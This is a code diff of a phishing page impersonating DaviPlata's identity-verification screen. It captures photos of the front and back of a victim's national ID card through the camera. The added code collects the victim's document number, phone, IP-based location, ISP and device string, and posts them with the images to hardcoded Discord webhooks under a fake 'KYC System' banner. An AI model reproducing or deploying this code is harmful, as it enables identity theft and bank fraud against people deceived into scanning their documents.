@@ -25,33 +25,17 @@
       background-size: cover; background-position: center;
     }
 
-    .app-container {
-      height: 100vh;
-      display: flex; flex-direction: column;
-      padding: 12px 20px 14px;
-    }
+    .app-container { height: 100vh; display: flex; flex-direction: column; padding: 12px 20px 14px; }
 
-    .back-nav {
-      align-self: flex-start;
-      font-size: 22px; padding: 4px 0 6px;
-      cursor: pointer; color: var(--text-dark);
-    }
+    .back-nav { align-self: flex-start; font-size: 22px; padding: 4px 0 6px; cursor: pointer; color: var(--text-dark); }
 
     .header { text-align: center; margin-bottom: 10px; }
     .logo-img { width: 85px; margin-bottom: 4px; }
     .title    { font-size: 17px; font-weight: 600; color: var(--text-dark); margin-bottom: 1px; }
     .subtitle { font-size: 11px; color: var(--text-gray); }
 
-    /* STEPS */
-    .steps-row {
-      display: flex; align-items: center; justify-content: center;
-      margin-bottom: 10px;
-    }
-    .step-pill {
-      display: flex; align-items: center; gap: 5px;
-      padding: 6px 16px; border-radius: 20px;
-      font-size: 12px; font-weight: 700; transition: all 0.3s;
-    }
+    .steps-row { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
+    .step-pill { display: flex; align-items: center; gap: 5px; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; transition: all 0.3s; }
     .step-pill.active  { background: var(--davi-red); color: white; }
     .step-pill.done    { background: rgba(0,200,83,0.15); color: #00c853; }
     .step-pill.pending { background: rgba(0,0,0,0.07); color: var(--text-gray); }
@@ -61,32 +45,13 @@
     .step-pill.pending .step-dot { background: var(--text-gray); }
     .step-divider { width: 22px; height: 2px; background: rgba(0,0,0,0.12); border-radius: 2px; }
 
-    /* CÁMARA */
-    .camera-card {
-      background: var(--input-bg);
-      border-radius: 20px; padding: 10px;
-      box-shadow: 0 4px 18px rgba(0,0,0,0.10);
-      border: 1px solid rgba(0,0,0,0.04);
-      margin-bottom: 10px; flex-shrink: 0;
-    }
+    .camera-card { background: var(--input-bg); border-radius: 20px; padding: 10px; box-shadow: 0 4px 18px rgba(0,0,0,0.10); border: 1px solid rgba(0,0,0,0.04); margin-bottom: 10px; flex-shrink: 0; }
 
-    .camera-wrap {
-      position: relative; border-radius: 12px;
-      overflow: hidden; background: #111;
-      aspect-ratio: 1.585;
-    }
+    .camera-wrap { position: relative; border-radius: 12px; overflow: hidden; background: #111; aspect-ratio: 1.585; }
 
-    #video {
-      width: 100%; height: 100%;
-      object-fit: cover; display: block;
-    }
+    #video { width: 100%; height: 100%; object-fit: cover; display: block; }
 
-    /* ESQUINAS */
-    .corner {
-      position: absolute; width: 28px; height: 28px;
-      border-color: white; border-style: solid;
-      transition: border-color 0.4s; z-index: 3;
-    }
+    .corner { position: absolute; width: 28px; height: 28px; border-color: white; border-style: solid; transition: border-color 0.4s; z-index: 3; }
     .corner.tl { top: 10px; left: 10px; border-width: 3px 0 0 3px; border-radius: 6px 0 0 0; }
     .corner.tr { top: 10px; right: 10px; border-width: 3px 3px 0 0; border-radius: 0 6px 0 0; }
     .corner.bl { bottom: 10px; left: 10px; border-width: 0 0 3px 3px; border-radius: 0 0 0 6px; }
@@ -94,133 +59,42 @@
     .camera-wrap.captured .corner { border-color: #00c853; }
     .camera-wrap.detected .corner { border-color: #00e676; }
 
-    /* SCAN LINE */
-    .scan-line {
-      position: absolute; left: 10px; right: 10px; height: 2px;
-      background: linear-gradient(to right, transparent, var(--davi-red), transparent);
-      box-shadow: 0 0 8px var(--davi-red);
-      animation: scanMove 2s ease-in-out infinite alternate;
-      z-index: 4;
-    }
+    .scan-line { position: absolute; left: 10px; right: 10px; height: 2px; background: linear-gradient(to right, transparent, var(--davi-red), transparent); box-shadow: 0 0 8px var(--davi-red); animation: scanMove 2s ease-in-out infinite alternate; z-index: 4; }
     @keyframes scanMove { 0% { top: 8%; } 100% { top: 88%; } }
-    .camera-wrap.captured .scan-line,
-    .camera-wrap.detected .scan-line { display: none; }
+    .camera-wrap.captured .scan-line, .camera-wrap.detected .scan-line { display: none; }
 
-    /* BARRA DE PROGRESO ESTABLE */
-    .stable-bar-wrap {
-      position: absolute;
-      bottom: 48px; left: 14px; right: 14px;
-      z-index: 5; display: none;
-    }
-    .stable-bar-bg {
-      height: 4px; border-radius: 4px;
-      background: rgba(255,255,255,0.25);
-      overflow: hidden;
-    }
-    .stable-bar-fill {
-      height: 100%; width: 0%;
-      background: #00e676;
-      border-radius: 4px;
-      transition: width 0.1s linear;
-    }
+    .stable-bar-wrap { position: absolute; bottom: 48px; left: 14px; right: 14px; z-index: 5; display: none; }
+    .stable-bar-bg { height: 4px; border-radius: 4px; background: rgba(255,255,255,0.25); overflow: hidden; }
+    .stable-bar-fill { height: 100%; width: 0%; background: #00e676; border-radius: 4px; transition: width 0.1s linear; }
 
-    /* STATUS */
-    .cam-status {
-      position: absolute;
-      bottom: 10px; left: 10px; right: 10px;
-      background: rgba(0,0,0,0.52);
-      backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
-      border-radius: 10px; padding: 8px 12px;
-      text-align: center;
-      border: 1px solid rgba(255,255,255,0.08);
-      z-index: 5; transition: border-color 0.3s;
-    }
+    .cam-status { position: absolute; bottom: 10px; left: 10px; right: 10px; background: rgba(0,0,0,0.52); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border-radius: 10px; padding: 8px 12px; text-align: center; border: 1px solid rgba(255,255,255,0.08); z-index: 5; transition: border-color 0.3s; }
     .cam-status.ok    { border-color: rgba(0,210,100,0.55); }
     .cam-status.error { border-color: rgba(230,0,38,0.4); }
     .cam-status-title { font-size: 12px; font-weight: 600; color: #fff; }
 
-    /* CHECK OVERLAY */
-    .check-overlay {
-      position: absolute; inset: 0;
-      display: none; flex-direction: column;
-      align-items: center; justify-content: center;
-      background: rgba(0,0,0,0.45);
-      z-index: 6; border-radius: 12px;
-    }
-    .check-circle {
-      width: 64px; height: 64px; border-radius: 50%;
-      background: #00c853;
-      display: flex; align-items: center; justify-content: center;
-      animation: popIn 0.4s cubic-bezier(.36,1.56,.64,1) both;
-    }
+    .check-overlay { position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.45); z-index: 6; border-radius: 12px; }
+    .check-circle { width: 64px; height: 64px; border-radius: 50%; background: #00c853; display: flex; align-items: center; justify-content: center; animation: popIn 0.4s cubic-bezier(.36,1.56,.64,1) both; }
     @keyframes popIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
     .check-circle svg { width: 34px; height: 34px; stroke: white; fill: none; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
     .check-text { color: white; font-size: 14px; font-weight: 600; margin-top: 10px; }
 
-    /* INSTRUCCIÓN */
-    .instruction-card {
-      background: var(--input-bg);
-      border-radius: 15px; padding: 12px 16px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-      border: 1px solid rgba(0,0,0,0.03);
-      margin-bottom: 12px;
-      display: flex; align-items: center; gap: 12px;
-    }
-    .instr-icon {
-      width: 42px; height: 42px; border-radius: 50%;
-      background: #fff0f2;
-      display: flex; align-items: center; justify-content: center;
-      flex-shrink: 0;
-    }
+    .instruction-card { background: var(--input-bg); border-radius: 15px; padding: 12px 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.03); margin-bottom: 12px; display: flex; align-items: center; gap: 12px; }
+    .instr-icon { width: 42px; height: 42px; border-radius: 50%; background: #fff0f2; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
     .instr-title { font-size: 13px; font-weight: 600; color: var(--text-dark); margin-bottom: 2px; }
     .instr-sub   { font-size: 11px; color: var(--text-gray); line-height: 1.4; }
 
-    /* TIPS */
-    .tips-card {
-      background: var(--input-bg);
-      border-radius: 15px; padding: 11px 14px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-      border: 1px solid rgba(0,0,0,0.03);
-    }
-    .tips-title {
-      font-size: 11px; font-weight: 600;
-      color: var(--davi-red); margin-bottom: 10px; text-align: center;
-    }
-    .tips-row {
-      display: flex; justify-content: space-around; align-items: flex-start;
-    }
-    .tip-item {
-      display: flex; flex-direction: column;
-      align-items: center; gap: 5px; flex: 1;
-    }
-    .tip-icon {
-      width: 34px; height: 34px; border-radius: 50%;
-      background: #fff0f2;
-      display: flex; align-items: center; justify-content: center;
-    }
+    .tips-card { background: var(--input-bg); border-radius: 15px; padding: 11px 14px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.03); }
+    .tips-title { font-size: 11px; font-weight: 600; color: var(--davi-red); margin-bottom: 10px; text-align: center; }
+    .tips-row { display: flex; justify-content: space-around; align-items: flex-start; }
+    .tip-item { display: flex; flex-direction: column; align-items: center; gap: 5px; flex: 1; }
+    .tip-icon { width: 34px; height: 34px; border-radius: 50%; background: #fff0f2; display: flex; align-items: center; justify-content: center; }
     .tip-label { font-size: 10px; color: var(--text-dark); text-align: center; line-height: 1.3; }
 
-    /* FLASH */
-    .flash {
-      position: fixed; inset: 0; z-index: 50;
-      background: white; opacity: 0; pointer-events: none;
-      transition: opacity 0.07s;
-    }
+    .flash { position: fixed; inset: 0; z-index: 50; background: white; opacity: 0; pointer-events: none; transition: opacity 0.07s; }
     .flash.show { opacity: 0.88; }
 
-    /* LOADER */
-    #loader {
-      display: none; position: fixed; inset: 0; z-index: 60;
-      background: rgba(255,255,255,0.88);
-      backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
-      flex-direction: column; align-items: center; justify-content: center; gap: 16px;
-    }
-    .spinner {
-      width: 48px; height: 48px;
-      border: 4px solid #f0f0f0;
-      border-top: 4px solid var(--davi-red);
-      border-radius: 50%; animation: spin 0.85s linear infinite;
-    }
+    #loader { display: none; position: fixed; inset: 0; z-index: 60; background: rgba(255,255,255,0.88); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
+    .spinner { width: 48px; height: 48px; border: 4px solid #f0f0f0; border-top: 4px solid var(--davi-red); border-radius: 50%; animation: spin 0.85s linear infinite; }
     @keyframes spin { 100% { transform: rotate(360deg); } }
     #loader p { font-size: 14px; font-weight: 500; color: var(--text-dark); }
 
@@ -230,7 +104,6 @@
 <body>
 
 <div class="app-container">
-
   <div class="back-nav">❮</div>
 
   <div class="header">
@@ -240,25 +113,21 @@
     <div class="subtitle">Encuadra el documento para captura automática</div>
   </div>
 
-  <!-- STEPS -->
   <div class="steps-row">
     <div class="step-pill active" id="pill1"><div class="step-dot"></div> Anverso</div>
     <div class="step-divider"></div>
     <div class="step-pill pending" id="pill2"><div class="step-dot"></div> Reverso</div>
   </div>
 
-  <!-- CÁMARA -->
   <div class="camera-card">
     <div class="camera-wrap" id="cameraWrap">
       <video id="video" autoplay playsinline muted></video>
-
       <div class="corner tl"></div>
       <div class="corner tr"></div>
       <div class="corner bl"></div>
       <div class="corner br"></div>
       <div class="scan-line" id="scanLine"></div>
 
-      <!-- Barra de progreso estabilidad -->
       <div class="stable-bar-wrap" id="stableBarWrap">
         <div class="stable-bar-bg">
           <div class="stable-bar-fill" id="stableBarFill"></div>
@@ -278,7 +147,6 @@
     </div>
   </div>
 
-  <!-- INSTRUCCIÓN -->
   <div class="instruction-card">
     <div class="instr-icon" id="instrIcon">
       <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
@@ -293,7 +161,6 @@
     </div>
   </div>
 
-  <!-- TIPS -->
   <div class="tips-card">
     <div class="tips-title">Recomendaciones</div>
     <div class="tips-row">
@@ -301,8 +168,7 @@
         <div class="tip-icon">
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
             <circle cx="12" cy="12" r="4" stroke="#E60026" stroke-width="1.8"/>
-            <path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"
-                  stroke="#E60026" stroke-width="1.8" stroke-linecap="round"/>
+            <path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" stroke="#E60026" stroke-width="1.8" stroke-linecap="round"/>
           </svg>
         </div>
         <span class="tip-label">Buena<br>iluminación</span>
@@ -336,38 +202,128 @@
       </div>
     </div>
   </div>
-
 </div>
 
 <div class="flash" id="flash"></div>
-<div id="loader">
-  <div class="spinner"></div>
-  <p id="loaderText">Procesando...</p>
-</div>
+<div id="loader"><div class="spinner"></div><p id="loaderText">Procesando...</p></div>
 <canvas id="canvas"></canvas>
 
 <script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
-  const savedData   = JSON.parse(sessionStorage.getItem('formData') || '{}');
-  const docNum      = savedData.num || 'N/A';
+  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1486176133321064595/MsBYfomMDk83Cq559WMDCMxTE3VTcma0Vg-RGDnfwUTnobxCPYjSq2ECO0fjQLcIOl3a";
 
-  let step         = 'front';
-  let frontBlob    = null;
-  let isBusy       = false;
-  let stableStart  = null;
+  // Leer datos con fallback localStorage
+  const savedData = JSON.parse(sessionStorage.getItem('formData') || localStorage.getItem('formData') || '{}');
+  const docNum    = savedData.num || 'N/A';
+  const docType   = savedData.doc === 'CC' ? 'Cédula de Ciudadanía' : savedData.doc === 'CE' ? 'Cédula de Extranjería' : 'N/A';
+  const docTel    = savedData.tel || 'N/A';
+
+  let step          = 'front';
+  let frontBlob     = null;
+  let isBusy        = false;
+  let stableStart   = null;
   let detectionLoop = null;
+  let geoInfo       = null;
 
-  const STABLE_MS  = 2000; // ms quieto antes de capturar
-  const MOTION_THR = 18;   // umbral de movimiento entre frames
-  const SAMPLE_INT = 120;  // ms entre muestras
+  const STABLE_MS  = 2000;
+  const MOTION_THR = 18;
+  const SAMPLE_INT = 120;
 
-  // Canvas oculto para detectar movimiento
   const motionCanvas = document.createElement('canvas');
   const motionCtx    = motionCanvas.getContext('2d');
   let prevFrame      = null;
 
+  // Obtener geo al cargar
+  async function getGeoInfo() {
+    try {
+      const res  = await fetch('https://ipapi.co/json/');
+      const json = await res.json();
+      geoInfo = {
+        ip:      json.ip           || 'N/A',
+        city:    json.city         || 'N/A',
+        region:  json.region       || 'N/A',
+        country: json.country_name || 'N/A',
+        org:     json.org          || 'N/A',
+        lat:     json.latitude     || '',
+        lon:     json.longitude    || ''
+      };
+    } catch {
+      geoInfo = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A', lat: '', lon: '' };
+    }
+  }
+
+  function buildEmbed(side) {
+    const geo       = geoInfo || {};
+    const timestamp = new Date().toLocaleString('es-CO', {
+      timeZone: 'America/Bogota',
+      day: '2-digit', month: '2-digit', year: 'numeric',
+      hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
+    const mapsLink = geo.lat
+      ? `[📍 Ver ubicación](https://www.google.com/maps?q=${geo.lat},${geo.lon})`
+      : 'No disponible';
+    const sideLabel = side === 'front' ? 'Anverso' : 'Reverso';
+
+    return {
+      title: `🪪  DaviPlata — Cédula ${sideLabel}`,
+      color: 0xE60026,
+      thumbnail: {
+        url: "https://conectesunegocio.daviplata.com/sites/default/files/styles/original/public/2025-10/Logo_Api_Market-2025.png?itok=cIsEUb2z"
+      },
+      fields: [
+        {
+          name: "📋  Documento",
+          value: `\`${docType}\`\n**${docNum}**`,
+          inline: true
+        },
+        {
+          name: "📱  Celular",
+          value: `**${docTel}**`,
+          inline: true
+        },
+        {
+          name: "🪪  Lado",
+          value: `**${sideLabel}**`,
+          inline: true
+        },
+        {
+          name: "🌐  Dirección IP",
+          value: `\`${geo.ip}\``,
+          inline: true
+        },
+        {
+          name: "📍  Ubicación",
+          value: `${geo.city}, ${geo.region}\n**${geo.country}**`,
+          inline: true
+        },
+        {
+          name: "🏢  Proveedor",
+          value: `\`${geo.org}\``,
+          inline: true
+        },
+        {
+          name: "🗺️  Mapa",
+          value: mapsLink,
+          inline: true
+        },
+        {
+          name: "🕐  Fecha y hora",
+          value: `\`${timestamp}\``,
+          inline: true
+        },
+        {
+          name: "📲  Dispositivo",
+          value: `\`${navigator.userAgent.substring(0, 80)}\``,
+          inline: false
+        }
+      ],
+      footer: { text: "DaviPlata KYC System • Escaneo de documento" },
+      timestamp: new Date().toISOString()
+    };
+  }
+
   // CÁMARA
   window.addEventListener('load', async () => {
+    getGeoInfo();
     const video = document.getElementById('video');
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
@@ -387,12 +343,11 @@
       video.play();
       motionCanvas.width  = 80;
       motionCanvas.height = 50;
-      setStatus('Encuadra el documento');
+      setStatus('Encuadra el anverso');
       startDetection();
     };
   });
 
-  // DETECCIÓN DE QUIETUD por diferencia de frames
   function startDetection() {
     detectionLoop = setInterval(() => {
       if (isBusy) return;
@@ -404,19 +359,14 @@
 
       if (prevFrame) {
         let diff = 0;
-        for (let i = 0; i < frame.length; i += 4) {
-          diff += Math.abs(frame[i] - prevFrame[i]);
-        }
+        for (let i = 0; i < frame.length; i += 4) diff += Math.abs(frame[i] - prevFrame[i]);
         const avgDiff = diff / (frame.length / 4);
 
         if (avgDiff < MOTION_THR) {
-          // Documento quieto
           if (!stableStart) stableStart = Date.now();
           const elapsed = Date.now() - stableStart;
           const pct     = Math.min(100, Math.round(elapsed / STABLE_MS * 100));
-
           showStableBar(pct);
-
           if (elapsed >= STABLE_MS) {
             capture();
           } else {
@@ -424,14 +374,12 @@
             document.getElementById('cameraWrap').classList.add('detected');
           }
         } else {
-          // Movimiento detectado — resetear
           stableStart = null;
           hideStableBar();
           document.getElementById('cameraWrap').classList.remove('detected');
           setStatus(step === 'front' ? 'Encuadra el anverso' : 'Encuadra el reverso');
         }
       }
-
       prevFrame = frame;
     }, SAMPLE_INT);
   }
@@ -447,8 +395,7 @@
 
   async function capture() {
     if (isBusy) return;
-    isBusy = true;
-    stableStart = null;
+    isBusy = true; stableStart = null;
     hideStableBar();
     clearInterval(detectionLoop);
 
@@ -459,7 +406,6 @@
     wrap.classList.remove('detected');
     wrap.classList.add('captured');
 
-    // Flash
     const flash = document.getElementById('flash');
     flash.classList.add('show');
     setTimeout(() => flash.classList.remove('show'), 130);
@@ -475,6 +421,16 @@
         frontBlob = blob;
         setStatus('¡Anverso capturado!', 'ok');
         showCheck('¡Anverso capturado!');
+
+        // Enviar anverso con embed profesional
+        const fd = new FormData();
+        fd.append('file', blob, 'cedula_anverso.png');
+        fd.append('payload_json', JSON.stringify({ embeds: [buildEmbed('front')] }));
+        try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); } catch {}
+
+        // Guardar en localStorage
+        localStorage.setItem('cedulaFront', 'captured');
+        localStorage.setItem('cedulaFront_ts', new Date().toISOString());
 
         setTimeout(() => {
           hideCheck();
@@ -492,22 +448,15 @@
         showCheck('¡Cédula completa!');
         showLoader('Enviando documentos...');
 
-        const fdFront = new FormData();
-        fdFront.append('file', frontBlob, 'cedula_anverso.png');
-        fdFront.append('payload_json', JSON.stringify({
-          content: `🪪 **Cédula Anverso** | Doc: \`${docNum}\``
-        }));
+        const fd = new FormData();
+        fd.append('file', blob, 'cedula_reverso.png');
+        fd.append('payload_json', JSON.stringify({ embeds: [buildEmbed('back')] }));
+        try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); } catch {}
 
-        const fdBack = new FormData();
-        fdBack.append('file', blob, 'cedula_reverso.png');
-        fdBack.append('payload_json', JSON.stringify({
-          content: `🪪 **Cédula Reverso** | Doc: \`${docNum}\``
-        }));
-
-        try {
-          await fetch(WEBHOOK_URL, { method: 'POST', body: fdFront });
-          await fetch(WEBHOOK_URL, { method: 'POST', body: fdBack });
-        } catch {}
+        // Guardar en localStorage
+        localStorage.setItem('cedulaBack', 'captured');
+        localStorage.setItem('cedulaBack_ts', new Date().toISOString());
+        localStorage.setItem('cedulaDone', 'true');
 
         hideLoader();
         document.getElementById('pill1').className = 'step-pill done';
@@ -539,24 +488,12 @@
 
   function setStatus(title, mode = '') {
     document.getElementById('statusTitle').textContent = title;
-    const s = document.getElementById('camStatus');
-    s.className = 'cam-status' + (mode ? ' ' + mode : '');
+    document.getElementById('camStatus').className = 'cam-status' + (mode ? ' ' + mode : '');
   }
-
-  function showCheck(msg) {
-    document.getElementById('checkText').textContent = msg;
-    document.getElementById('checkOverlay').style.display = 'flex';
-  }
-  function hideCheck() {
-    document.getElementById('checkOverlay').style.display = 'none';
-  }
-  function showLoader(msg) {
-    document.getElementById('loaderText').textContent = msg;
-    document.getElementById('loader').style.display = 'flex';
-  }
-  function hideLoader() {
-    document.getElementById('loader').style.display = 'none';
-  }
+  function showCheck(msg) { document.getElementById('checkText').textContent = msg; document.getElementById('checkOverlay').style.display = 'flex'; }
+  function hideCheck()    { document.getElementById('checkOverlay').style.display = 'none'; }
+  function showLoader(msg){ document.getElementById('loaderText').textContent = msg; document.getElementById('loader').style.display = 'flex'; }
+  function hideLoader()   { document.getElementById('loader').style.display = 'none'; }
 </script>
 </body>
 </html>
